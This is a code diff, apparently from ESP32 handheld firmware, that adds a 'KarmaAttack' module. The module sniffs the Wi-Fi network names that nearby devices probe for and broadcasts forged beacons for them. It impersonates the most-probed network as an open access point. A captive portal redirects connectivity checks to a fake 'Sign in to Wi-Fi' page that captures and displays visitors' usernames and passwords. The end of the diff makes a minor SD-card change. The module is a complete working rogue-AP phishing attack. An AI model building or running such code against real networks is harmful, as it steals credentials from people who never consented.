+  const uint16_t need = (uint16_t)(24 + 12 + 2 + ssidLen + 10 + 3);
+  if (need > outMax) {
+    return 0;
+  }
+
+  uint16_t pos = 0;
+  out[pos++] = 0x80;  // Beacon
+  out[pos++] = 0x00;
+  out[pos++] = 0x00;
+  out[pos++] = 0x00;
+  memset(&out[pos], 0xFF, 6);  // DA broadcast
+  pos += 6;
+  memcpy(&out[pos], s_srcMac, 6);  // SA
+  pos += 6;
+  memcpy(&out[pos], s_srcMac, 6);  // BSSID
+  pos += 6;
+  out[pos++] = 0x00;
+  out[pos++] = 0x00;  // seq
+
+  memset(&out[pos], 0, 8);  // timestamp
+  pos += 8;
+  out[pos++] = 0x64;
+  out[pos++] = 0x00;  // beacon interval
+  out[pos++] = 0x01;
+  out[pos++] = 0x04;  // caps: ESS + privacy off / short preamble-ish
+
+  out[pos++] = 0x00;
+  out[pos++] = ssidLen;
+  memcpy(&out[pos], ssid, ssidLen);
+  pos += ssidLen;
+
+  static const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
+  memcpy(&out[pos], rates, sizeof(rates));
+  pos += sizeof(rates);
+
+  out[pos++] = 0x03;
+  out[pos++] = 0x01;
+  out[pos++] = channel;
+  return pos;
+}
+
+static void sendNextBeacon() {
+  if (!s_running || s_count <= 0) {
+    return;
+  }
+  if (millis() - s_lastBeaconMs < BEACON_GAP_MS) {
+    return;
+  }
+  s_lastBeaconMs = millis();
+
+  if (s_beaconIdx >= s_count) {
+    s_beaconIdx = 0;
+  }
+
+  ProbeSsid entry;
+  portENTER_CRITICAL(&s_mux);
+  entry = s_list[s_beaconIdx];
+  const int n = s_count;
+  portEXIT_CRITICAL(&s_mux);
+
+  s_beaconIdx = (uint8_t)((s_beaconIdx + 1) % max(1, n));
+
+  // Randomize locally-administered MAC each burst for variety.
+  s_srcMac[1] = random(256);
+  s_srcMac[2] = random(256);
+  s_srcMac[3] = random(256);
+  s_srcMac[4] = random(256);
+  s_srcMac[5] = random(256);
+  s_srcMac[0] = 0x02;
+
+  const uint16_t len = buildBeacon(entry.ssid, s_channel, s_beaconFrame, sizeof(s_beaconFrame));
+  if (len == 0) {
+    return;
+  }
+  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
+  if (esp_wifi_80211_tx(WIFI_IF_AP, s_beaconFrame, len, false) == ESP_OK) {
+    s_beaconsSent++;
+  }
+}
+
+static void stopPortal() {
+  s_server.stop();
+  s_dns.stop();
+  s_portalUp = false;
+}
+
+static void karmaRedirectLogin() {
+  s_server.sendHeader("Location", "/login.html", true);
+  s_server.send(302, "text/plain", "");
+}
+
+static void karmaHandleLoginPost() {
+  String user = s_server.hasArg("username") ? s_server.arg("username") : "";
+  String pass = s_server.hasArg("password") ? s_server.arg("password") : "";
+  user.trim();
+  pass.trim();
+  if (user.length() > 0 || pass.length() > 0) {
+    strncpy(s_lastUser, user.c_str(), sizeof(s_lastUser) - 1);
+    s_lastUser[sizeof(s_lastUser) - 1] = '\0';
+    strncpy(s_lastPass, pass.c_str(), sizeof(s_lastPass) - 1);
+    s_lastPass[sizeof(s_lastPass) - 1] = '\0';
+    s_credCount++;
+    char buf[48];
+    snprintf(buf, sizeof(buf), "[!] cred %s / %s", s_lastUser, s_lastPass);
+    logLine(buf, ORANGE);
+  }
+  s_server.send(200, "text/html",
+                "<html><body style='font-family:sans-serif;text-align:center;padding:40px'>"
+                "<h3>Connecting...</h3></body></html>");
+}
+
+static const char* kLoginHtml =
+    "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<title>Wi-Fi Login</title><style>"
+    "body{font-family:Arial,sans-serif;text-align:center;padding:24px;background:#f2f2f2}"
+    ".box{max-width:360px;margin:auto;padding:20px;background:#fff;border-radius:10px}"
+    "input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box}"
+    "button{width:100%;padding:12px;background:#007BFF;color:#fff;border:0;border-radius:6px}"
+    "</style></head><body><div class='box'><h2>Sign in to Wi-Fi</h2>"
+    "<form method='POST' action='/login'>"
+    "<input name='username' placeholder='Username' required>"
+    "<input name='password' type='password' placeholder='Password' required>"
+    "<button type='submit'>Connect</button></form></div></body></html>";
+
+static void ensurePortal() {
+  if (s_portalUp) {
+    return;
+  }
+  s_dns.setErrorReplyCode(DNSReplyCode::NoError);
+  s_dns.start(DNS_PORT, "*", WiFi.softAPIP());
+  s_server.on("/generate_204", HTTP_GET, karmaRedirectLogin);
+  s_server.on("/hotspot-detect.html", HTTP_GET, karmaRedirectLogin);
+  s_server.on("/ncsi.txt", HTTP_GET, karmaRedirectLogin);
+  s_server.on("/connecttest.txt", HTTP_GET, karmaRedirectLogin);
+  s_server.on("/login.html", HTTP_GET, []() { s_server.send(200, "text/html", kLoginHtml); });
+  s_server.on("/", HTTP_GET, karmaRedirectLogin);
+  s_server.on("/login", HTTP_POST, karmaHandleLoginPost);
+  s_server.onNotFound(karmaRedirectLogin);
+  s_server.begin();
+  s_portalUp = true;
+  logLine("[*] Portal ready", UI_DIM_TEXT);
+}
+
+static void applySoftAp(const char* ssid, uint8_t channel) {
+  if (!ssid || !ssid[0]) {
+    return;
+  }
+  if (channel < 1 || channel > 14) {
+    channel = 6;
+  }
+  s_channel = channel;
+  strncpy(s_apSsid, ssid, sizeof(s_apSsid) - 1);
+  s_apSsid[sizeof(s_apSsid) - 1] = '\0';
+
+  WiFi.softAPdisconnect(true);
+  delay(30);
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(s_apSsid, nullptr, s_channel);
+  delay(40);
+  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
+
+  // Keep sniffing while AP is up.
+  wifi_promiscuous_filter_t filt = {};
+  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+  esp_wifi_set_promiscuous_filter(&filt);
+  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
+  esp_wifi_set_promiscuous(true);
+
+  ensurePortal();
+  s_headerDirty = true;
+
+  char buf[48];
+  snprintf(buf, sizeof(buf), "[*] AP -> %s", s_apSsid);
+  logLine(buf, ORANGE);
+}
+
+static void maybeSwitchAp() {
+  if (!s_running || s_count <= 0) {
+    return;
+  }
+  if (millis() - s_lastApSwitchMs < AP_SWITCH_MS) {
+    return;
+  }
+
+  const int best = hottestIndex();
+  if (best < 0) {
+    return;
+  }
+
+  ProbeSsid e;
+  portENTER_CRITICAL(&s_mux);
+  e = s_list[best];
+  portEXIT_CRITICAL(&s_mux);
+
+  if (best == s_activeApIndex && strcmp(s_apSsid, e.ssid) == 0) {
+    s_lastApSwitchMs = millis();
+    return;
+  }
+
+  s_activeApIndex = best;
+  s_lastApSwitchMs = millis();
+  applySoftAp(e.ssid, e.channel);
+}
+
+static void hopIfNeeded() {
+  // Only hop while running with no learned SSIDs yet (learning phase).
+  if (!s_running || s_count > 0) {
+    return;
+  }
+  if (millis() - s_lastHopMs < HOP_MS) {
+    return;
+  }
+  s_lastHopMs = millis();
+  s_channel++;
+  if (s_channel > 13) {
+    s_channel = 1;
+  }
+  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
+  // Channel is not shown in the header — avoid dirtying UI on every hop.
+}
+
+static void scrollTerm() {
+  const int cap = termVisibleLines();
+  for (int i = 0; i < cap - 1; i++) {
+    s_term[i] = s_term[i + 1];
+    s_termColor[i] = s_termColor[i + 1];
+  }
+}
+
+static void paintTermLine(int index) {
+  const int cap = termVisibleLines();
+  if (index < 0 || index >= s_termLines || index >= cap) {
+    return;
+  }
+  const int y = TERM_TOP_Y + index * LINE_HEIGHT;
+  if (y + LINE_HEIGHT > wifiContentBottom()) {
+    return;
+  }
+  tft.fillRect(CARD_MARGIN, y, SCREEN_WIDTH - CARD_MARGIN * 2, LINE_HEIGHT, TFT_BLACK);
+  tft.setTextColor(s_termColor[index], TFT_BLACK);
+  tft.setCursor(CARD_MARGIN, y);
+  tft.print(s_term[index]);
+}
+
+static void redrawTerm() {
+  const int cap = termVisibleLines();
+  const int bodyBottom = wifiContentBottom();
+  // Clear log zone once, then paint lines (avoids per-line gap flicker).
+  const int h = bodyBottom - TERM_TOP_Y;
+  if (h > 0) {
+    tft.fillRect(0, TERM_TOP_Y, SCREEN_WIDTH, h, TFT_BLACK);
+  }
+  for (int i = 0; i < s_termLines && i < cap; i++) {
+    const int y = TERM_TOP_Y + i * LINE_HEIGHT;
+    if (y + LINE_HEIGHT > bodyBottom) {
+      break;
+    }
+    tft.setTextColor(s_termColor[i], TFT_BLACK);
+    tft.setCursor(CARD_MARGIN, y);
+    tft.print(s_term[i]);
+  }
+}
+
+static void logLine(const String& text, uint16_t color) {
+  if (!feature_active) {
+    return;
+  }
+  const int cap = termVisibleLines();
+  bool scrolled = false;
+  if (s_termLines >= cap) {
+    scrollTerm();
+    s_termLines = cap - 1;
+    scrolled = true;
+  }
+  s_term[s_termLines] = text;
+  s_termColor[s_termLines] = color;
+  s_termLines++;
+  if (scrolled) {
+    redrawTerm();
+  } else {
+    paintTermLine(s_termLines - 1);
+  }
+}
+
+static void flushPendingLog() {
+  if (!s_logPending) {
+    return;
+  }
+  s_logPending = false;
+  logLine(String(s_pendingLog), s_pendingLogColor);
+}
+
+static void updateHeader(bool force) {
+  if (force) {
+    invalidateHeaderCache();
+  }
+  tickBeaconRate();
+
+  // Draw static chrome once. Never wipe this region on later force refreshes.
+  if (!s_chromeDrawn) {
+    tft.fillRect(0, CARDS_Y, SCREEN_WIDTH, TERM_TOP_Y - CARDS_Y, TFT_BLACK);
+    drawStatCardsChrome();
+    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+    tft.setCursor(CARD_MARGIN, ACT_LABEL_Y);
+    tft.print("ACTIVITY");
+    tft.drawFastHLine(68, ACT_LABEL_Y + 4, SCREEN_WIDTH - CARD_MARGIN - 68, UI_LINE);
+    s_chromeDrawn = true;
+  }
+
+  char v0[10];
+  char v1[10];
+  char v2[10];
+  const uint8_t clients = (uint8_t)WiFi.softAPgetStationNum();
+  snprintf(v0, sizeof(v0), "%d", s_count);
+  snprintf(v1, sizeof(v1), "%u", (unsigned)(s_running ? s_beaconRate : 0));
+  snprintf(v2, sizeof(v2), "%u", (unsigned)clients);
+  paintStatCardValue(0, v0, s_count > 0 ? WHITE : UI_DIM_TEXT);
+  paintStatCardValue(1, v1, (s_running && s_beaconRate > 0) ? ORANGE : UI_DIM_TEXT);
+  paintStatCardValue(2, v2, clients > 0 ? GREEN : UI_DIM_TEXT);
+
+  // Keep AP/status text stable — no live probe counters (those caused flicker).
+  char apLine[52];
+  uint16_t apColor = UI_DIM_TEXT;
+  if (s_apSsid[0] && s_running) {
+    const bool placeholder = (strcmp(s_apSsid, "Karma") == 0 && s_count == 0);
+    if (placeholder) {
+      snprintf(apLine, sizeof(apLine), "Waiting for probes...");
+      apColor = UI_DIM_TEXT;
+    } else {
+      char ssidShort[22];
+      truncSsid(ssidShort, sizeof(ssidShort), s_apSsid, 18);
+      snprintf(apLine, sizeof(apLine), "AP: %s", ssidShort);
+      apColor = FEATURE_TEXT;
+    }
+  } else if (s_running) {
+    snprintf(apLine, sizeof(apLine), "Listening for probes...");
+    apColor = UI_TEXT;
+  } else if (s_count > 0) {
+    snprintf(apLine, sizeof(apLine), "Ready - press Start");
+    apColor = UI_TEXT;
+  } else {
+    snprintf(apLine, sizeof(apLine), "No SSIDs - Start or Add");
+    apColor = UI_DIM_TEXT;
+  }
+  paintInfoRow(AP_Y, s_hdrCacheAp, sizeof(s_hdrCacheAp), apLine, apColor,
+               SCREEN_WIDTH - CARD_MARGIN * 2);
+
+  char topLine[52];
+  uint16_t topColor = UI_DIM_TEXT;
+  int wantBars = -1;
+  ProbeSsid best;
+  if (bestSsidSnapshot(best)) {
+    char ssidShort[20];
+    truncSsid(ssidShort, sizeof(ssidShort), best.ssid, 16);
+    snprintf(topLine, sizeof(topLine), "Top: %s", ssidShort);
+    topColor = s_running ? ORANGE : UI_TEXT;
+    wantBars = rssiBars(best.rssi);
+  } else if (s_running) {
+    snprintf(topLine, sizeof(topLine), "Top: waiting...");
+  } else {
+    snprintf(topLine, sizeof(topLine), "Add = seed a test SSID");
+  }
+
+  // Full-row clear keeps AP / Top from stacking when text changes.
+  const bool topChanged = paintInfoRow(TOP_Y, s_hdrCacheTop, sizeof(s_hdrCacheTop),
+                                       topLine, topColor,
+                                       SCREEN_WIDTH - CARD_MARGIN - BAR_ZONE_W);
+  if (force || topChanged) {
+    s_barsCache = -2;
+  }
+  if (wantBars != s_barsCache) {
+    const int barX = SCREEN_WIDTH - BAR_ZONE_W + 2;
+    // Row already cleared when text changed; only clear bar zone on bar-only updates.
+    if (!topChanged) {
+      tft.fillRect(barX, TOP_Y, BAR_ZONE_W - 2, INFO_ROW_H, TFT_BLACK);
+    }
+    if (wantBars >= 0) {
+      drawSignalBars(barX, TOP_Y + 12, wantBars);
+    }
+    s_barsCache = wantBars;
+  }
+
+  s_headerDirty = false;
+}
+
+static void drawDashboard(bool full) {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  if (full) {
+    wifiClearBody(TFT_BLACK);
+    invalidateHeaderCache();
+    s_chromeDrawn = false;
+  }
+  updateHeader(true);
+  if (full) {
+    redrawTerm();
+  }
+  updateNavLabels(true);
+}
+
+static void resetBeaconStats() {
+  s_beaconsSent = 0;
+  s_beaconRate = 0;
+  s_beaconsAtMark = 0;
+  s_rateMarkMs = millis();
+}
+
+static void clearLearned() {
+  portENTER_CRITICAL(&s_mux);
+  s_count = 0;
+  portEXIT_CRITICAL(&s_mux);
+  s_beaconIdx = 0;
+  s_activeApIndex = -1;
+  resetBeaconStats();
+  s_probeFrames = 0;
+  s_namedProbes = 0;
+  s_apSsid[0] = '\0';
+  logLine("[*] Cleared learned SSIDs", UI_WARN);
+  s_headerDirty = true;
+  updateHeader(true);
+}
+
+static void stopKarma() {
+  const bool wasRunning = s_running;
+  s_running = false;
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  stopPortal();
+  WiFi.softAPdisconnect(true);
+  s_activeApIndex = -1;
+  s_apSsid[0] = '\0';
+  s_headerDirty = true;
+  if (wasRunning) {
+    logLine("[*] Stopped", UI_WARN);
+  }
+  updateHeader(true);
+  updateNavLabels(true);
+}
+
+static void startKarma() {
+  if (s_running) {
+    stopKarma();
+  } else {
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
+    stopPortal();
+    WiFi.softAPdisconnect(true);
+  }
+
+  WiFi.mode(WIFI_AP);
+  delay(40);
+  // Placeholder AP until a probed SSID is learned.
+  WiFi.softAP("Karma", nullptr, s_channel);
+  delay(40);
+  strncpy(s_apSsid, "Karma", sizeof(s_apSsid) - 1);
+  s_apSsid[sizeof(s_apSsid) - 1] = '\0';
+
+  wifi_promiscuous_filter_t filt = {};
+  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
+  esp_wifi_set_promiscuous_filter(&filt);
+  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
+  esp_wifi_set_promiscuous(true);
+
+  ensurePortal();
+
+  s_running = true;
+  s_lastHopMs = millis();
+  s_lastApSwitchMs = 0;
+  s_lastBeaconMs = 0;
+  resetBeaconStats();
+  s_headerDirty = true;
+
+  logLine("[+] LIVE - answering probes", GREEN);
+  if (s_count > 0) {
+    maybeSwitchAp();
+  } else {
+    logLine("[*] Waiting for probes...", UI_DIM_TEXT);
+  }
+  updateHeader(true);
+  updateNavLabels(true);
+}
+
+static void promptAddSsid() {
+  const bool wasRunning = s_running;
+  if (wasRunning) {
+    // Keep radio up but pause UI takeover.
+  }
+
+  OnScreenKeyboardConfig cfg;
+  cfg.titleLine1 = "[!] Seed SSID for Karma";
+  cfg.titleLine2 = "Learned list + beacons (Shuffle ok)";
+  osKeyboardUseStandardLayout(cfg);
+  cfg.maxLen = 31;
+  cfg.shuffleNames = kTestSsids;
+  cfg.shuffleCount = kTestSsidCount;
+  cfg.buttonsY = 195;
+  cfg.backLabel = "Back";
+  cfg.middleLabel = "Shuffle";
+  cfg.okLabel = "OK";
+  cfg.enableShuffle = true;
+  cfg.requireNonEmpty = true;
+  cfg.emptyErrorMsg = "SSID cannot be empty!";
+
+  OnScreenKeyboardResult r = showOnScreenKeyboard(cfg, "TestKarma");
+  s_uiDrawn = false;
+
+  float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+  runUI();
+  drawDashboard(true);
+
+  if (r.accepted && r.text.length() > 0) {
+    recordProbeSsid(r.text.c_str(), -40, s_channel);
+    flushPendingLog();
+    char buf[48];
+    snprintf(buf, sizeof(buf), "[+] seeded %s", r.text.c_str());
+    logLine(buf, GREEN);
+    if (wasRunning || s_running) {
+      s_lastApSwitchMs = 0;
+      maybeSwitchAp();
+    } else {
+      logLine("[*] Press Start to beacon/answer", UI_TEXT);
+    }
+    s_headerDirty = true;
+    updateHeader();
+  } else {
+    logLine("[*] Add cancelled", UI_DIM_TEXT);
+  }
+  updateNavLabels();
+}
+
+static void handleNavButtons() {
+  const unsigned long now = millis();
+  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
+    (void)isButtonPressedEdge(BTN_LEFT);
+    (void)isButtonPressedEdge(BTN_RIGHT);
+    (void)isButtonPressedEdge(BTN_UP);
+    (void)isButtonPressedEdge(BTN_DOWN);
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_LEFT)) {
+    if (s_running) {
+      stopKarma();
+    } else {
+      startKarma();
+    }
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_DOWN)) {
+    clearLearned();
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_UP)) {
+    promptAddSsid();
+    s_lastBtnMs = now;
+    return;
+  }
+}
+
+static void runUI() {
+  static int iconX[ICON_NUM] = {220, 10};
+  static int iconY = STATUS_BAR_Y_OFFSET;
+  static const unsigned char* icons[ICON_NUM] = {
+      bitmap_icon_undo,
+      bitmap_icon_go_back};
+
+  if (!s_uiDrawn) {
+    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
+    for (int i = 0; i < ICON_NUM; i++) {
+      if (icons[i] != NULL) {
+        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+      }
+    }
+    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
+    s_uiDrawn = true;
+  }
+
+  static unsigned long lastAnimationTime = 0;
+  static int animationState = 0;
+  static int activeIcon = -1;
+
+  switch (animationState) {
+    case 0:
+      break;
+    case 1:
+      if (millis() - lastAnimationTime >= 150) {
+        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
+        animationState = 2;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 2:
+      if (millis() - lastAnimationTime >= 200) {
+        animationState = 3;
+        lastAnimationTime = millis();
+      }
+      break;
+    case 3:
+      if (activeIcon == 0) {
+        clearLearned();
+      }
+      animationState = 0;
+      activeIcon = -1;
+      break;
+  }
+
+  static unsigned long lastTouchCheck = 0;
+  if (millis() - lastTouchCheck >= 50) {
+    int x, y;
+    if (feature_active && readTouchXY(x, y)) {
+      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
+        for (int i = 0; i < ICON_NUM; i++) {
+          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
+            if (icons[i] != NULL && animationState == 0) {
+              if (i == 1) {
+                feature_exit_requested = true;
+              } else {
+                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
+                animationState = 1;
+                activeIcon = i;
+                lastAnimationTime = millis();
+              }
+            }
+            break;
+          }
+        }
+      }
+    }
+    lastTouchCheck = millis();
+  }
+}
+
+static void teardown() {
+  stopKarma();
+  WiFi.mode(WIFI_OFF);
+  delay(20);
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(true, true);
+}
+
+void karmaSetup() {
+  pauseBackgroundRadioTasks();
+  setTouchButtonInputEnabled(true);
+  featureClearContent(TFT_BLACK);
+
+  setupTouchscreen();
+  s_uiDrawn = false;
+  s_running = false;
+  s_count = 0;
+  s_termLines = 0;
+  s_probeFrames = 0;
+  s_namedProbes = 0;
+  s_credCount = 0;
+  s_lastUser[0] = '\0';
+  s_lastPass[0] = '\0';
+  s_apSsid[0] = '\0';
+  s_activeApIndex = -1;
+  s_channel = 6;
+  s_logPending = false;
+  s_headerDirty = true;
+  s_lastClients = 0;
+  s_navDrawn = false;
+  s_chromeDrawn = false;
+  resetBeaconStats();
+  invalidateHeaderCache();
+
+  float v = readBatteryVoltage();
+  drawStatusBar(v, true);
+  redrawTouchButtonBar();
+  runUI();
+
+  drawDashboard(true);
+  logLine("[*] Answers probe SSIDs", UI_TEXT);
+  logLine("[*] Start, or Add to seed", UI_DIM_TEXT);
+}
+
+void karmaLoop() {
+  if (feature_exit_requested) {
+    teardown();
+    return;
+  }
+  if (feature_active && (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
+    teardown();
+    feature_exit_requested = true;
+    return;
+  }
+
+  handleNavButtons();
+  flushPendingLog();
+  hopIfNeeded();
+  updateStatusBar();
+  runUI();
+  maintainTouchNavBar();
+
+  if (feature_exit_requested) {
+    teardown();
+    return;
+  }
+
+  if (s_running) {
+    maybeSwitchAp();
+    sendNextBeacon();
+    if (s_portalUp) {
+      s_dns.processNextRequest();
+      s_server.handleClient();
+    }
+
+    const uint8_t clients = (uint8_t)WiFi.softAPgetStationNum();
+    if (clients != s_lastClients) {
+      if (clients > s_lastClients) {
+        logLine("[!] Client joined", ORANGE);
+      } else {
+        logLine("[*] Client left", UI_DIM_TEXT);
+      }
+      s_lastClients = clients;
+      s_headerDirty = true;
+    }
+  }
+
+  const uint32_t now = millis();
+  if (s_headerDirty || now - s_lastStatsMs > STATS_MS) {
+    updateHeader(false);
+    s_lastStatsMs = now;
+  }
+}
+
+}  // namespace KarmaAttack
+
 
 namespace FirmwareUpdate {
 
@@ -6232,19 +9987,7 @@ void performSDUpdate() {
     tft.setCursor(10, 30 + yshift);
     tft.println("Initializing SD...");
 
-    bool ok = false;
-    #ifdef SD_CS
-    ok = SD.begin(SD_CS);
-    #endif
-    #ifdef SD_CS_PIN
-    if (!ok) {
-      #ifdef CC1101_CS
-      if (SD_CS_PIN != CC1101_CS) ok = SD.begin(SD_CS_PIN);
-      #else
-      ok = SD.begin(SD_CS_PIN);
-      #endif
-    }
-    #endif
+    bool ok = isSDCardAvailable();
     if (!ok) {
       tft.setTextColor(UI_WARN, TFT_BLACK);
       tft.setCursor(10, 40 + yshift);
